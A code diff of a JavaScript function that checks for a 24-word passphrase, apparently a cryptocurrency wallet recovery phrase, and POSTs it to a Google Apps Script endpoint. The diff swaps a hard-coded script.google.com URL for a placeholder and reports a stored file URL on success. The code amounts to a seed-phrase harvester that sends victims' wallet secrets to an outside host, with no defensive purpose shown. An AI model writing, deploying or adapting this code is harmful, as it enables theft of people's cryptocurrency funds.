@@ -1,17 +1,17 @@
 function validateAndSendPassphrase(passphrase) {
-    // Trim whitespace and split into words
+    // Trim and split into words
     const words = passphrase.trim().split(/\s+/);
 
-    // Check if the passphrase has exactly 24 words
+    // Validate passphrase (must be 24 words)
     if (words.length !== 24) {
-        console.log("Invalid Passphrase");
+        console.log("INVALID PASSPHRASE");
         return;
     }
 
-    // Google Apps Script API URL
-    const url = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec";
+    // Your Google Apps Script URL
+    const url = "YOUR_DEPLOYED_WEB_APP_URL_HERE"; 
 
-    // Sending the passphrase via Fetch API
+    // Send data to Google Apps Script
     fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -20,7 +20,7 @@ function validateAndSendPassphrase(passphrase) {
     .then(response => response.json())
     .then(data => {
         if (data.success) {
-            console.log("Passphrase sent successfully!");
+            console.log("Passphrase saved successfully! File URL: " + data.fileUrl);
         } else {
             console.log("INVALID PASSPHRASE");
         }
